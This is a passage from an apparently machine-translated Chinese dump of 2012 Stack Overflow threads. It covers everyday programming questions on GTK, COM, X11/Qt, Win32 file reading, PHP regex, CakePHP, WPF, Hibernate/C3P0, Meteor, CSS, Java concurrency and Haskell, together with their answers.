是的，您可以将文本缓冲区的内容以 GTK 的内部序列化格式保存到文件中——这保证了文本缓冲区和序列化文本之间可以存在一对一的对应关系。签出`Gtk.TextBuffer.RegisterSerializeTagset`，`Gtk.TextBuffer.Serialize`等。

您还可以编写自己的序列化转换器并注册它们。我曾经为 RTF 写过一篇；[Sourceforge 页面](http://sf.net/projects/osxcart)。但是，要让它在 Mono 中工作，您可能必须以某种方式编写绑定。最新版本确实适用于 GObject Introspection，但据我所知，这对 Mono 不可用。我愿意帮助您编写绑定，但我对编写 Mono 绑定一无所知。如果你最终写了一个，请告诉我，我会将它包含在项目中。

# c# - 无法将“System.__ComObject”类型的 COM 对象转换为接口类型“IImageList”

> ID：10658461
> 
> 赞同：2
> 
> 时间：2012-05-18T19:11:59.197
> 
> 标签：c#, shell

我正在使用[这篇文章代码](http://www.vbaccelerator.com/home/NET/Code/Libraries/Shell_Projects/SysImageList/article.asp)来提取超大图标。只要我从 UI Thread 调用它的方法 GetIcon，一切正常。但是如果我从其他线程调用，它会抛出这个错误

```
Unable to cast COM object of type 'System.__ComObject' to interface type 'IImageList'. 
This operation failed because the QueryInterface call on the COM component for the interface with IID 
'{46EB5926-582E-4017-9FDF-E8998DAA0950}' failed due to the following error: 
No such interface supported (Exception from HRESULT: 0x80004002 (E_NOINTERFACE)). 
```

我不能使用 UI 线程来提取数千个图标。有什么解决办法吗？

# c++ - 检测系统托盘\任务栏方向（X11）

> ID：10658463
> 
> 赞同：1
> 
> 时间：2012-05-18T19:12:05.617
> 
> 标签：c++, qt, x11, taskbar, tray

我创建了一个 TrayPopupWidget，它应该会在托盘附近弹出。然后我意识到如果用户改变了任务栏的方向或高度，它会在错误的位置弹出。所以我创建了 TaskbarDetector 类。

我试图获取托盘|任务栏的窗口几何图形，但我只得到错误的窗口属性...我尝试在 KDE、LXDE -> 相同的不良行为...

代码： [http ://bzfriendsplasm.svn.sourceforge.net/viewvc/bzfriendsplasm/BZFriends/taskbardetector.cpp?revision=156&view=markup](http://bzfriendsplasm.svn.sourceforge.net/viewvc/bzfriendsplasm/BZFriends/taskbardetector.cpp?revision=156&view=markup)

```
 //Getting screen resolutoin
int num_sizes;

Rotation original_rotation;

Display *display = XOpenDisplay(NULL);

Window root = RootWindow(display, 0);

XRRScreenSize *xrrs = XRRSizes(display, 0, &num_sizes);

XRRScreenConfiguration *conf = XRRGetScreenInfo(display, root);

XRRConfigCurrentRate(conf);

SizeID original_size_id = XRRConfigCurrentConfiguration(conf, &original_rotation);

p_screenWidth = xrrs[original_size_id].width;
p_screenHeight = xrrs[original_size_id].height;

//Getting tray position

unsigned long  sysTraySelection = 0;

Screen *screen = XDefaultScreenOfDisplay(display);

//FIXME !!!
QString  *net_sys_tray = new QString("_NET_SYSTEM_TRAY_S%i");

(*net_sys_tray) = net_sys_tray->replace ("%i",QString::number (XScreenNumberOfScreen(screen)));

sysTraySelection = XInternAtom(display, net_sys_tray->toLocal8Bit (), False);

if ( sysTraySelection == None)
    return  Unknown;

trayWindow = XGetSelectionOwner(display, sysTraySelection);

XWindowAttributes w_attr;
unsigned long status = XGetWindowAttributes (display,trayWindow,&w_attr);

if ( status == 0)
    return Unknown;

p_taskBarLeft       = w_attr.y;
p_taskBarTop       = w_attr.x;
p_taskBarBottom  = w_attr.x + w_attr.height;
p_taskBarRight     = w_attr.y + w_attr.width;

qDebug () << QString("Window id:  " ) + QString::number (trayWindow);
 qDebug() << QString("SysTraySelection: ") + QString::number (sysTraySelection );
 qDebug() << QString("Top ") + QString::number (p_taskBarTop);
 qDebug() << QString("Left ") + QString::number (p_taskBarLeft);
 qDebug() << QString("Bottom ") + QString::number (p_taskBarBottom);
 qDebug() << QString("Right " ) + QString::number (p_taskBarRight);

XCloseDisplay(display);

delete net_sys_tray;

return decideOrientation (); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T20:27:57.923

终于，我找到了一种检测方法！

1.  我正在寻找一个具有停靠属性且可见的窗口，然后在其上调用 XGetWindowAttributes(...)。
2.  如果我为 QApplication::setEventFilter() 设置过滤方法，我也可以获得每个 XEvent、_NET_WORKAREA 事件（当您调整或移动任务栏时会发生此事件），然后我重新调用任务栏/托盘检测方法。

但是，这适用于 KDE4 和 GNOME 和 LXDE，我打算让用户自己设置弹出位置。

```
bool TaskBarDetector::lookUpDockWindow ( unsigned long &rootWindow, bool check)
{
Display *display = QX11Info::display ();

Window parent;
Window *children;
unsigned int noOfChildren;
int status;

if ( check && checkDockProperty(rootWindow)  )
{
    trayWindow = rootWindow;
    return true;
}

status = XQueryTree (display, rootWindow, &rootWindow, &parent, &children, &noOfChildren);

if (status == 0)
{
    qDebug() << "ERROR - Could not query the window tree. Aborting.";
    trayWindow = 0;
    return false;
}

if (noOfChildren == 0)
{
    trayWindow = 0;
    return false;
}

for (unsigned int ind = 0 ; ind < noOfChildren; ++ind )
{

    if ( lookUpDockWindow ( children[ind] ,true) )
        return true;
}

XFree ((char*) children);

trayWindow = 0;

return false;
}

bool TaskBarDetector::checkDockProperty(unsigned long window)
{
Display *x11display = QX11Info::display ();
Atom *atoms;
int numberAtoms = 0;

char *atomName;
XTextProperty prop;
XWindowAttributes windowattr;

atoms = XListProperties (x11display, window, &numberAtoms);

for (int ind = 0; ind < numberAtoms; ++ind )
{
    atomName = XGetAtomName(x11display, atoms[ind]);

    if (QString(atomName).compare ("_NET_WM_WINDOW_TYPE" )  != 0 )
        continue;

    unsigned long status = XGetTextProperty (x11display,window,&prop,atoms[ind]);

    if ( status == 0 )
        continue;

    int value = (int) (*prop.value);

    if (value != 151 )
        continue;

    if (XGetWindowAttributes(x11display,window,&windowattr) == 0)
       continue;

    return windowattr.map_state == 2;

}

return false;
}

 void TaskBarDetector::saveWindowAttr(unsigned long root)
{
XWindowAttributes windowattr;

Display *x11display =QX11Info::display ();

if (XGetWindowAttributes(x11display,trayWindow,&windowattr) == 0)
{
    trayWindow = 0;
    return;
}

int x = 0;
int y = 0;

Window *w = &trayWindow;

if(  XTranslateCoordinates(x11display,trayWindow,root,windowattr.x,windowattr.y,&x,&y,w) == True)
{

    p_taskBarTop = y;
    p_taskBarLeft = x;
    p_taskBarRight = p_taskBarLeft + windowattr.width;
    p_taskBarBottom = p_taskBarTop + windowattr.height;
    p_taskBarHeight = windowattr.height;
    p_taskBarWidth = windowattr.width;

} else
        {
           p_orientation           = Unknown;
           p_taskBarTop         = 0;
           p_taskBarLeft         = 0;
           p_taskBarRight       =  0;
           p_taskBarBottom    = 0;
           p_taskBarHeight     = 0;
           p_taskBarWidth      = 0;

        }

bool TaskBarDetector::appEventFilter(void *msg, long *result)
{

Q_UNUSED(result);

if ( !TaskBarDetector::hasInstance() )
    return false;

TaskBarDetector *detector = TaskBarDetector::getInstance();

#ifdef Q_WS_WIN
MSG *seged = static_cast<MSG*>(msg);
if ( seged->message == WM_SETTINGCHANGE && seged->wParam == SPI_SETWORKAREA )
{
    detector->processDetectEvent();
    return false;
}

return false;
#endif

#ifdef Q_WS_X11
XEvent *xevent = static_cast<XEvent*> (msg);

if ( xevent->type == PropertyNotify  )
{
    XPropertyEvent xpe = xevent->xproperty;

    char * ch_atom_name = XGetAtomName(QX11Info::display(),xpe.atom);

    QString atom_name = QString(ch_atom_name).trimmed ();

    if (  atom_name == "_NET_WORKAREA" )
    {
        detector->processDetectEvent ();
        return false;
    }

}

return false;

#endif
} 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:41:56.787

系统托盘本身不一定是一个窗口。在 KDE 中，这只是任务栏中的一个区域（与`_NET_SYSTEM_TRAY_S%i`选择所有者无关）。

您可能想尝试嵌入托盘图标并获取其几何形状，然后显示您的小部件“靠近”所述图标（对于“靠近”的一些合理值）。一旦知道图标的几何形状，就可以删除图标（但是如果用户移动托盘，您将不知道它的新坐标）。

这不是 100% 可靠的，因为托盘没有义务显示您可以扔给它的所有图标。此外，由于图标闪烁，视觉上并不令人愉悦。但总比没有好。

# c++ - 如何设置标题标题以包装在 QTableWidget 中

> ID：10658464
> 
> 赞同：1
> 
> 时间：2012-05-18T19:12:08.747
> 
> 标签：c++, qt, qt-creator

我正在使用 Qt 在表格中显示一堆信息。我有一个 QTableWidget 对象，并且我想要包含的一些标题比我想要的单元格大小长。例如，我想拥有

```
<html> <br>Acceleration <br> (m/s^2) </html> 
```

而不是让两者在同一行。我知道单元格中有自动换行功能，但我想将标题保留在标题中，以便更容易区分它们。字符串中的 HTML 似乎在标题中也不起作用，所以我不能使用`<br>`. 有没有办法让文本换行，或者在标题中手动换行？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T22:12:34.633

您可以使用简单`\n`的手动打破标题标题：

```
#include <QApplication>
#include <QTableWidget>

int main(int argc, char *argv[])
{
    QApplication app(argc, argv);

    QTableWidget w(2, 2);
    w.setHorizontalHeaderLabels(QStringList() << "FOO\nBAR" << "FOOBAR");
    w.show();

    return app.exec();
} 
```

# c++ - 使用 WIN32 读取文本文件

> ID：10658465
> 
> 赞同：3
> 
> 时间：2012-05-18T19:12:10.213
> 
> 标签：c++, winapi, file-io

我正在尝试使用 c++ 中的 win32 程序解析文本文件。有没有一种简单的逐行读取文本文件的方法？我的文本文件由我想存储在 char 数组（const char* cArray[67]）中的字符串组成。这是我到目前为止所拥有的。我正在使用 CreateFile 和 ReadFile。我从 readfile 收到访问冲突错误（0x000003e6）：

```
CDECK::CDECK():filename(".\\Deck/list.txt")
{
    LPVOID data = NULL;
    hFile = CreateFileA(filename, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
        MessageBox(NULL, L"Failed to CreateFile - 'hFile'", L"CDECK::CDECK()", MB_OK);

    DWORD fileSize = GetFileSize(hFile, &fileSize);
    DWORD read = -1;
    if(!ReadFile(hFile, data, fileSize, &read, NULL))
    {
        DWORD err = GetLastError();
        MessageBox(NULL, L"Failed to ReadFile - 'hFile'", L"CDECK::CDECK()", MB_OK);
    }
    return;
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-18T19:31:05.477

> 有没有一种简单的逐行读取文本文件的方法？

是的：

```
{
  std::ifstream hFile(filename);

  std::vector<std::string> lines;
  std::string line;
  while(std::getline(hFile, line))
    lines.push_back(line);

  return lines;
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-18T19:14:41.503

考虑这段代码：

```
LPVOID data = NULL;
if(!ReadFile(hFile, data, fileSize, &read, NULL)) 
```

这里`data`为null，后面的参数是整个文件的大小。您应该分配一个缓冲区，然后将一个指向该缓冲区的指针及其大小传递给它。函数将在其中`ReadFile`写入读取的字节。

这是让它与静态大小的缓冲区一起工作的简单方法：

```
char data[4096] = {};
if(!ReadFile(hFile, static_cast< LPVOID >( &data ), 4096, &read, NULL)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T03:57:43.533

您的问题是您正在读取文件的字节，要读取字符串，您需要使用**SysAllocStringByteLen**分配字符串位置，然后使用 ReadFile

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-18T10:29:48.843

您在读取数据之前忘记分配缓冲区空间：LPVOID data = NULL;

在阅读之前，您必须分配一个 fileSize 缓冲区空间： data = malloc(fileSize);

并且可能还必须将您的数据变量声明为 char* 而不是 void*

# php - php 中的正则表达式 - 需要从变量中删除 [sometext ...]

> ID：10658468
> 
> 赞同：0
> 
> 时间：2012-05-18T19:12:29.003
> 
> 标签：php, regex, str-replace

我需要一个简单的帮助：需要匹配：

```
[sometext]
[sometext value=1]
[sometext value=1 anothervalue=2] 
```

使用 php 正则表达式并在整个 $content 变量中替换为 null

```
$content = str_replace('/??????/','',$content); 
```

我应该用什么代替问号？

Ps ...有人知道傻瓜学习正则表达式的好资源吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:24:15.743

您应该使用的正则表达式应该类似于：

```
/\[[^\]]*\]/ 
```

它基本上分解为：

*   `\[`匹配左方括号。
*   `[^\]]*`匹配任何内容，直到下一个右方括号。
*   `\]`匹配结束方括号。

此外，您应该使用`preg_replace`, 因为`str_replace`不接受正则表达式。所以你最终得到：

```
$content = preg_replace('/\[[^\]]*\]/', '', $content); 
```

您可以在 PHP 文档的[PCRE regex syntax](http://www.php.net/manual/en/reference.pcre.pattern.syntax.php) page 中找到有关 PHP 中使用的 regex 风格的大量信息。

# cakephp - CakePHP 中与 HABTM 相关的复选框

> ID：10658471
> 
> 赞同：1
> 
> 时间：2012-05-18T19:13:04.727
> 
> 标签：cakephp, associations

所以，我有通过 HABTM 关联的模型。在一个视图中，我使用复选框来保存关联。我可以保存数据没问题。但是我无法确定预先存在的关联复选框的干净程度，例如，当我进入“编辑”页面并想要编辑关联时。

在这种情况下，我有一个用户模型和一个调查模型。

这是我的观点的代码：

```
foreach ($users as $user) {
    echo $this->Form->input('User.User.', array('type' => 'checkbox', 'value' => $user['User']['id'], 'hiddenField' => false, 'label' => false )) . ' ' . $user['User']['username'];
} 
```

必须有一种方法可以在适当的地方简单地将框标记为选中。

# c# - WPF 4.0 的日期时间选择器

> ID：10658472
> 
> 赞同：15
> 
> 时间：2012-05-18T19:13:07.877
> 
> 标签：c#, wpf, xaml, datetimepicker

根据[这篇文章](https://stackoverflow.com/questions/560811/how-to-use-datetimepicker-in-wpf)，.net 4 中有一个单独的 DatePicker 控件。我已经尝试过了，但我没有看到让它选择一天中的时间的好方法。

有没有一种简单的方法可以通过编辑 XAML 模板将 DatePicker 转换为 DateTimePicker？如果没有，为 WPF 4.0 获取 DateTimePicker 的最佳方法是什么？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-05-18T19:37:37.203

[扩展的 WPF 工具包](https://github.com/xceedsoftware/wpftoolkit)带有一个不错的[DateTimePicker](https://github.com/xceedsoftware/wpftoolkit/wiki/DateTimePicker)与一天中的时间。

还有一篇关于 CP 的文章，其中有人创建了一个类似于 Winforms 的控件[......](http://www.codeproject.com/Articles/132992/A-WPF-DateTimePicker-That-Works-Like-the-One-in-Wi)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-18T19:32:56.597

没有自己制作或使用第 3 方控件的情况下没有一个。但是，如果您想要一个不支持数据绑定的快速修复，winforms 中有一个...

```
xmlns:window="clr-namespace:System.Windows.Forms.Integration;assembly=WindowsFormsIntegration"
xmlns:wf="clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"

<window:WindowsFormsHost >
    <wf:DateTimePicker Format="Time" ></wf:DateTimePicker>
</window:WindowsFormsHost> 
```

只是一个时间选择器，但可以很容易地与日期选择器配对。您还需要对 WindowsFormsIntegration 和 System.Windows.Forms 的引用。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-05-18T19:36:00.040

尝试扩展 WPF 工具包中的[DateTimePicker](http://wpftoolkit.codeplex.com/wikipage?title=DateTimePicker)。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2021-09-19T08:13:32.463

如果您确实想要一个没有外部控件的 DateTimePicker 并且也用于商业用途，我已经改进了一个现有的并在此处分享： [https ://gist.github.com/Apflkuacha/406e755c8b42a70b7ab138e6b985bcdf](https://gist.github.com/Apflkuacha/406e755c8b42a70b7ab138e6b985bcdf)

它看起来像这样，一个显示所选日期和时间的字段以及一个用于选择日期和时间的弹出窗口：

[![日期时间选择器](../Images/430043e0df4d56626ef36e82270667a3.png)](https://i.stack.imgur.com/yuIrN.png)

# java - jdbc 开始失败

> ID：10658473
> 
> 赞同：0
> 
> 时间：2012-05-18T19:13:22.803
> 
> 标签：java, spring, hibernate, jdbc, c3p0

访问 Web 服务时我随机收到此错误。很难复制，一旦我刷新它，一切都按预期运行。

```

    引起：org.hibernate.exception.JDBCConnectionException：无法执行查询
        在 org.hibernate.exception.SQLStateConverter.convert(SQLStateConverter.java:97)
        在 org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:66)
        在 org.hibernate.loader.Loader.doList(Loader.java:2235)
        在 org.hibernate.loader.Loader.listIgnoreQueryCache(Loader.java:2129)
        在 org.hibernate.loader.Loader.list(Loader.java:2124)
        在 org.hibernate.loader.criteria.CriteriaLoader.list（CriteriaLoader.java:118）
        在 org.hibernate.impl.SessionImpl.list(SessionImpl.java:1597)
        在 org.hibernate.impl.CriteriaImpl.list(CriteriaImpl.java:306)
        在 edu.asd.myproj.hibernate.adapter.CriteriaAdapter.list（CriteriaAdapter.java:380）
        在 edu.asd.myproj.DaoHibernateImpl.findByCriteria（DaoHibernateImpl.java:778）
        在 edu.asd.myproj.DaoHibernateImpl.findByCriteria（DaoHibernateImpl.java:765）
        在 edu.asd.myproj.DaoHibernateImpl.findByProperty(DaoHibernateImpl.java:361)
        在 edu.asd.myproj.ProfilesDaoImpl.count(ProfilesDaoImpl.java:81)
        在 sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        在 java.lang.reflect.Method.invoke(Method.java:597)
        在 org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:307)
        在 org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:182)
        在 org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:149)
        在 org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:106)
        在 org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
        在 org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:204)
        在 $Proxy27.count（未知来源）
        在 edu.asd.myproj.ResourceProfileLoaderNew.loadProfiles（ResourceProfileLoaderNew.java:66）
        在 sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        在 java.lang.reflect.Method.invoke(Method.java:597)
        在 org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:297)
        在 org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:250)
        在 org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:144)
        ... 50 更多
    原因：com.mysql.jdbc.exceptions.jdbc4.CommunicationsException：从服务器成功接收的最后一个数据包是44323秒前。最后一个成功发送到服务器的数据包是44323秒前，比服务器配置的值长'等待超时”。您应该考虑在应用程序中使用之前使连接有效性过期和/或测试，增加客户端超时的服务器配置值，或使用连接器/J 连接属性“autoReconnect=true”来避免此问题。
        在 sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        在 sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
        在 sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
        在 java.lang.reflect.Constructor.newInstance(Constructor.java:513)
        在 com.mysql.jdbc.Util.handleNewInstance(Util.java:406)
        在 com.mysql.jdbc.SQLError.createCommunicationsException（SQLError.java:1074）
        在 com.mysql.jdbc.MysqlIO.send(MysqlIO.java:3246)
        在 com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:1917)
        在 com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2060)
        在 com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2542)
        在 com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:1734)
        在 com.mysql.jdbc.PreparedStatement.executeQuery(PreparedStatement.java:1885)
        在 org.apache.commons.dbcp.DelegatingPreparedStatement.executeQuery(DelegatingPreparedStatement.java:93)
        在 org.hibernate.jdbc.AbstractBatcher.getResultSet(AbstractBatcher.java:208)
        在 org.hibernate.loader.Loader.getResultSet(Loader.java:1812)
        在 org.hibernate.loader.Loader.doQuery(Loader.java:697)
        在 org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:259)
        在 org.hibernate.loader.Loader.doList(Loader.java:2232)
        ... 79 更多
    引起：java.net.SocketException: Broken pipe
        在 java.net.SocketOutputStream.socketWrite0（本机方法）
        在 java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
        在 java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        在 java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:65)
        在 java.io.BufferedOutputStream.flush(BufferedOutputStream.java:123)
        在 com.mysql.jdbc.MysqlIO.send(MysqlIO.java:3227)
        ... 90 更多

```

这是我的 hibernate.properties 文件

```
# Turn on for SQL debugging
hibernate.show_sql=true

# Generate schema?
hibernate.hbm2ddl.auto=validate

#============================================================
# C3P0 connection pool configuration
#============================================================
#changed to default values 
c3p0.acquireIncrement=hibernate.c3p0.acquire_increment
c3p0.idleConnectionTestPeriod=hibernate.c3p0.idle_test_period
c3p0.initialPoolSize=10
c3p0.maxIdleTime=hibernate.c3p0.timeout
c3p0.maxPoolSize=hibernate.c3p0.max_size
c3p0.maxStatements=hibernate.c3p0.max_statements
c3p0.minPoolSize=hibernate.c3p0.min_size   
c3p0.testConnectionsOnCheckout=hibernate.c3p0.validate 
```

该错误随机出现一次，需要很长时间才能再次出现。刷新后消失。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-19T13:39:09.577

请发送完整的异常堆栈跟踪，以便读者进一步了解。

此异常通常在`DB Connection`陈旧时发生。

**陈旧意味着**：连接被服务器杀死，但仍然被池认为是活动的。您需要在连接中配置连接测试。对于这种方法，`C3P0`您必须使用以下配置：

```
c3p0.testConnectionOnCheckin = true
testConnectionOnCheckout= true 
```

和更多检查增加结帐超时如下：

```
c3p0.checkoutTimeout = 0 
```

并测试另一个测试选项，`C3P0`例如：

*   `connectionTesterClassName`
*   `idleConnectionTestPeriod`
*   `automaticTestTable`
*   `preferredTestQuery`

另一种测试方法是编写示例代码并通过代码连接到数据库`JDBC pure`。（通过`DriverManager`和`Connection`等）

# meteor - 当我在严格的客户端集合上调用更新/插入时会发生什么？

> ID：10658474
> 
> 赞同：3
> 
> 时间：2012-05-18T19:13:28.337
> 
> 标签：meteor

如果我使用 Meteor.publish 将文档推送到客户端集合（如“消息计数”示例中），那么当我在该客户端集合上插入/更新/删除时会发生什么（在文档中的示例）？考虑到服务器上甚至不存在“消息计数”集合，是否有任何东西到达服务器？在这种情况下，我们如何将文档更改传播到服务器？

注意：我已经看到@debergalis 的出色回答，他在其中详细解释了这个例子（这里：[https](https://stackoverflow.com/a/10566873/694222) ://stackoverflow.com/a/10566873/694222 ），这很有意义。但它没有涉及调用客户端集合（在他的示例中为“计数”）以插入/更新文档时会发生什么。

更新：

所以我自己尝试了一下，结果是这样的：如果我有一个名为 Counts 的客户端集合（使用 Meteor.publish 填充），那么 Counts.find 工作正常，但 Counts.insert 根本不起作用，说没有找到相关的 Meteor.method，这很好。

但现在我有一个新问题。如果我订阅的客户端集合与发布的服务器端集合具有相同的名称（我已经删除了自动发布流星包），那么执行插入客户端确实会传播到服务器端并将文档添加到服务器端 mongo。这显然是不能接受的。。

因此，基本上，具有相同名称的客户端集合（您传递给新 Meteor.Collection 的内容）可以成功更新具有相同名称的服务器端集合，即使关闭自动发布包也是如此。这是一个错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T10:29:31.413

`messages-count`不是集合，它是包含单个属性的单个记录的记录集。

您将房间 ID 传递给它，它会返回它的计数；你不能用那个记录集做更多的事情......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T01:35:26.483

> 如果我使用 Meteor.publish 将文档推送到客户端集合（如“消息计数”示例中），那么当我在该客户端集合上插入/更新/删除时会发生什么（在文档中的示例）？

API 文档中的“消息计数”示例使用“命名”集合。集合名称是“messages-count”。所有命名集合都存在于服务器端。当您插入/更新/删除客户端时，更改会自动传播到服务器集合。

以下是 API 文档的摘录：

> 如果您在创建集合时传递了一个名称，那么您就是在声明一个持久集合——一个存储在服务器上并可供所有用户查看的集合。客户端代码和服务器代码都可以使用相同的 API 访问相同的集合。

下一个问题：

> 考虑到服务器上甚至不存在“消息计数”集合，是否有任何东西到达服务器？

该集合确实存在于服务器上（见上文），因此是的，客户端集合上的所有插入/更新/删除都将传播到服务器。

> 在这种情况下，我们如何将文档更改传播到服务器？

如果您确实有一个仅限客户端的集合（例如，使用空名称创建的集合），那么您必须将什么传播到服务器？如果您希望传播更改，请使用命名集合。

# html - div 上的 3px 额外高度，其中包含图像

> ID：10658475
> 
> 赞同：7
> 
> 时间：2012-05-18T19:13:28.953
> 
> 标签：html

我正在开发一个新网站，但有一个小设计让我无法理解。

基本上，我正在创建一个用户可以上传有趣图片的网站。虽然显示图片的区域下方有 3px 的间隙。*这是指向我的意思的屏幕截图的链接，死链接*。

我已经尝试了很多东西，但似乎没有任何效果。如果有人可以提出任何解决方案，请执行。

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-18T19:18:52.157

这是由于`vertical-align`图像的默认值。他们是`baseline`。更改为`top`或`bottom`，它将消失。

```
img{
    vertical-align: top;
} 
```

额外的空间是基线下方的区域，用于悬挂在 like`y`或下方的字母`g`。

# javascript - 通过 iFrame src 发送自定义标题

> ID：10658476
> 
> 赞同：0
> 
> 时间：2012-05-18T19:13:30.910
> 
> 标签：javascript, ajax, xmlhttprequest

我正在尝试使用 ajax 和 iFrame 方法进行文件下载。

我遇到的问题是设置我的 iFrame SRC 方法。出于授权目的，我需要将带有额外字段的自定义请求标头传递给 src 中的文件。

我知道这样做的唯一方法是使用 XHR.setRequestHeader。但是我如何在 iFrame src 上执行此操作（当然，这基本上只是一个 GET）？

简而言之（也许是为了澄清目的）...我正在尝试通过 ajax 下载文件，并将自定义标头传递给下载管理器文件。有任何想法吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-23T06:21:19.023

不要使用 iFrame，这是错误的用途。

# java - 并发修改异常

> ID：10658478
> 
> 赞同：2
> 
> 时间：2012-05-18T19:13:34.830
> 
> 标签：java, multithreading, concurrency

我`java.util.ConcurrentModificationException`在这种方法上得到以下信息

```
private AtomicReference<HashMap<String, Logger>> transactionLoggerMap = new AtomicReference<HashMap<String,Logger>>();

public void rolloutFile() {

    // Get all the loggers and fire a temp log line.
    Set<String> transactionLoggerSet = (Set<String>) transactionLoggerMap.get().keySet();
    Iterator<String> transactionLoggerSetIter = transactionLoggerSet.iterator();
    while(transactionLoggerSetIter.hasNext()){
        String key = (String) transactionLoggerSetIter.next();
        Logger txnLogger = transactionLoggerMap.get().get(key);
        localLogger.trace("About to do timer task rollover:");
        txnLogger.info(DataTransformerConstants.IGNORE_MESSAGE);
    }
} 
```

请建议，如果我使用的是 Atomic Reference，我如何获得一个 como？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T19:16:07.260

A`ConcurrentModificationException`表示您已在迭代器之外修改了集合。我在你的循环中没有看到任何修改，所以我假设`transactionLoggerMap`在你迭代它的同时还有另一个线程也在添加或删除。

即使你把它包裹在一个 中`AtomicReference`，你仍然不能有两个线程同时对同一个非同步集合进行更改。 `AtomicReference`不会同步*它*正在包装的对象——它只是为您提供了一种以原子方式获取和设置该引用的方法。

您将需要通过使用该类或使用该方法`ConcurrentHashMap`包装您的方法来使其成为同步集合。`HashMap``Collections.synchronizedMap(map)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:15:51.847

因为您没有在迭代期间防止并发修改。原子参考仅确保您获得地图（及其内容）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:19:16.173

也许您可以考虑迭代集合的本地副本而不是同一个集合。这将是一种简单的方法，可以确保您的收藏在循环时不会被修改。建议在多线程环境中使用不可变对象，您可以免费防止此类问题。

希望能帮助到你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-20T18:51:35.437

删除多余的 `Set<String> transactionLoggerSet = (Set<String>) transactionLoggerMap.get().keySet();` 当您在地图上迭代时，您仍然必须使用同步。SynchronizedMap 保证其 API 方法的一致性。其余的，您需要进行客户端同步

# haskell - 约束中的模糊类型变量“f0”：Haskell

> ID：10658480
> 
> 赞同：1
> 
> 时间：2012-05-18T19:13:46.513
> 
> 标签：haskell

注意：可能有一些拼写错误（大写字母等），因为我的无线网卡在我的电脑上坏了，我无法在这个上安装 haskell，所以我重新输入代码（而且我没有记忆棒 xD）

我一直在使用
`Config line values 2 2` 定义一个配置，但我只是不喜欢这个函数'开始'。任何需要 f -> f 的东西都可以正常工作......

```
data Config = Config {
                     line :: Line,
                    nums :: [Nums],
                    indent :: Indent,
                       run :: Run
}  deriving (Eq, Show)

class (Result f) => Test f where 
          start :: Line -> [Nums] -> f

 instance Test Config where 
      start line nums = Config line nums 0 0 
```

如果我跑

```
 > start 2 [0,0,0] 
```

应该返回

```
 > Config 2 [0,0,0] 0 0 
```

我得到错误：

```
 Ambiguous type variable `f0' in the constraint:
  (Test f0) arising from a use of `start'
Probable fix: add a type signature that fixes these type variable(s) 
```

跑步

```
> :t Config 2 [0,0,0] 0 0 
```

给

```
> Config 2 [0,0,0] 0 0 :: Config 
```

哪个是对的

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:38:19.660

